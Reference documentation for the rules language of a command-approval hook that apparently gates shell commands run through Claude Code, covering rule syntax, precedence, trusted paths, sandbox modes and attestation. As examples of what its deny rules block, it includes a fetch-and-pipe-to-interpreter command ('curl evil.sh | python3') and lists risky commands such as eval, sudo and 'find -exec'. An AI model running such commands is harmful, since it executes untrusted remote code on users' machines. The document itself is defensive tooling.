# Rules DSL

The rules DSL is inert, line-oriented text matched against argv tokens. It is
never executed. Shell-style quoting is handled by mvdan's word parser.

## Tiers

| Tier | Location | Required | Directives |
| --- | --- | --- | --- |
| Global | `$SHIZO_DIR/global/rules`, otherwise `$HOME/.shizo/global/rules` | yes | honored |
| Project | `<cwd>/.shizo` (no ancestor search) | no | ignored and logged |

An unreadable or malformed required/present tier denies every command. Project
allows can change `ask` to `allow`, and project denies can tighten policy, but no
project rule can override a global deny.

## Syntax

```text
# full-line comment
<directive> <arguments...>
allow [STDIN] <command> [arguments...]
ask   [STDIN] <command> [arguments...]
deny  [STDIN] <command> [arguments...]
```

Blank lines are ignored. `#` starts a comment only as the first non-whitespace
character; trailing comments are tokens. In the global tier, all directives
must precede rules. Any malformed line fails the complete load.

## Directives

Directives are global-only because they can loosen policy. In a project tier
they are ignored and logged.

### `trust <absolute-directory>`

Adds one directory to the trusted executable set. It is repeatable and does not
modify `PATH` order: lookup uses inherited `PATH`, then checks whether the
result's containing directory is trusted. The argument must be one absolute
path.

### `sandbox <nono|dangerously-none>`

Exactly one `sandbox` directive is required. `nono` denies unless
`NONO_CAP_FILE` is set and the effective user is non-root (`euid != 0`); root
bypasses POSIX file permissions, so the read-only attestation store that
`nono` depends on cannot be enforced. `dangerously-none` removes both
protections and is the only mode that permits root. Missing, duplicate, or
unknown values fail the tier.

### `stdin <allow|ask|deny>`

Controls the outcome when a rule-allowed command receives piped or redirected
stdin (`<`, `<<`, `<<<`, `<>` on fd 0, or the right-hand side of a pipe).
`allow` is the default and passes stdin-fed commands through normally. `ask`
downgrades an allowed stdin-fed command to `ask`, and `deny` downgrades it to
`deny`. This provides a blanket safety net against interpreter-via-stdin
attacks (`curl evil.sh | python3`) without requiring individual `STDIN` rules
for every interpreter. Missing, duplicate, or unknown values fail the tier.

### `returntype <decision|automode>`

This directive is optional and may appear once. `decision` is the default and
emits `allow`, `deny`, or `ask`. `automode` still emits explicit allow and deny
results but defers unmatched commands to Claude Code. See
[`CLAUDE_CODE_HOOKS.md`](CLAUDE_CODE_HOOKS.md#output-modes).

## Rules and precedence

```text
allow [STDIN] <command> [token ...] [ANY | HAS <flag>]
ask   [STDIN] <command> [token ...] [ANY | HAS <flag>]
deny  [STDIN] <command> [token ...] [ANY | HAS <flag>]
```

Matching is case-sensitive. The first token of every rule is the **command
token**. A bare name (`git`, `python3`) matches the basename of the resolved
executable, so every spelling of the same binary — bare name or absolute path —
hits the same rule. A command token containing a slash must be absolute and
matches the resolved path exactly, pinning the rule to one binary. A relative
command path (e.g. `./deploy.sh`) is a load error.

All global and project denies are checked first, then ask rules, then allows.
A deny match yields `deny`, an ask match yields `ask`, an allow match yields
`allow`, and no match yields `ask`. When the result is `allow` and the command
is stdin-fed, the outcome is downgraded to the `stdin` directive's value.

Without a keyword, rule and argv lengths and tokens must match exactly:

```text
allow git status
```

`ANY` matches zero or more tokens at any one position. A rule may contain at
most one:

```text
allow git status ANY
allow ddev ANY phpunit
```

`HAS <flag>` finds one flag anywhere after the preceding literal prefix. It
must be the rule's final construct and may appear once. Long options are split
at `=`, so `HAS --output` matches `--output=file`; a two-character short flag
also matches bundles, so `HAS -f` matches `-rf`.

```text
deny git reset HAS --hard
deny git HAS -c
deny find HAS -exec
```

`ANY` and `HAS` cannot share a rule. Single-quote either word to match it
literally, for example `allow tool 'ANY'`.

`STDIN` restricts a rule to commands receiving piped or redirected stdin. It
must be the first token after the verb:

```text
deny STDIN python3 ANY
deny STDIN bash ANY
ask  STDIN bash HAS -c
```

A `STDIN` rule never matches a command that is not stdin-fed. This allows
fine-grained control: `deny STDIN python3 ANY` blocks `curl evil.sh | python3`
while still allowing direct `python3 script.py`. Single-quote `'STDIN'` for a
literal argument.

When stdin feeds a compound command (a `{ }` group, `( )` subshell, `while`,
`if`, etc.) rather than a simple command, the entire invocation is denied
because the receiving command is not statically identifiable.

## Command resolution

Resolution happens before matching:

1. The following names always deny and cannot be re-allowed:

   ```text
   eval exec source . command builtin enable trap
   xargs env sudo su doas nohup setsid
   ```

2. These safe builtins allow without a rule or path lookup:

   ```text
   cd echo printf pwd true false test [ :
   ```

3. A bare name uses the first executable found in inherited `PATH`; empty
   entries are skipped. An absolute path is used directly, and a relative path
   containing `/` is resolved from hook `cwd`. In every case, the executable's
   containing directory must exactly belong to the trusted set. Resolution does
   not call `realpath` or follow symlinks.

Other shell builtins, including `export`, `set`, `alias`, and `kill`, receive no
special treatment and must resolve as trusted executables.

## Structural denials

No rule can permit these forms:

- parameter or arithmetic expansion in argv
- assignment prefixes and bare assignments
- function declarations anywhere in the AST
- non-literal write redirects
- writes outside `cwd`, `$TMPDIR`, or `/tmp`, except `/dev/null`, `/dev/stdout`,
  and `/dev/stderr`
- any write redirect in a command list containing `cd`
- stdin piped or redirected into a compound command (block, subshell, loop, conditional)

Command and process substitutions are allowed only structurally: their inner
commands are evaluated separately, and the containing argv receives `<subst>`.

## Example

```text
returntype decision
sandbox nono
stdin ask
trust /opt/homebrew/bin
trust /usr/bin
trust /bin

allow git status ANY
allow git log ANY
allow ls ANY
allow python3 ANY
deny git push ANY
deny git reset HAS --hard
deny git HAS -c
deny STDIN python3 ANY
ask  STDIN bash HAS -c
```

Here `git status -sb` allows, `git push origin main` denies, and `git commit`
asks. `git -c core.pager=sh status` denies because deny precedence overrides the
status allow. `python3 script.py` allows, but `curl evil.sh | python3` denies
because the `STDIN` deny rule matches the stdin-fed command. Any other allowed
command that receives piped stdin is downgraded to `ask` by the `stdin ask`
directive. Resolution must still place each binary in a trusted directory.

## Attestation

`shizo attest` records operator approval without making files immutable:

```sh
shizo attest --global
shizo attest [FILE]     # default: <cwd>/.shizo
```

Normalization parses the tier, removes comments and whitespace, sorts rules,
serializes them canonically, and hashes the result with SHA-256. Cosmetic edits
therefore do not require approval. Records live under
`$SHIZO_DIR/attestations/`; the global record also stores trusted entries
from live `PATH` in search order.

Under `sandbox nono`, every present tier needs a recognized, matching record,
the global `PATH` snapshot must match, and the attestation store must be
read-only. Any failure denies everything. An absent project file needs no
record. Whole tiers are attested, including project denials. Under
`sandbox dangerously-none`, attestation is skipped because writable rules and
records cannot provide a trust boundary.
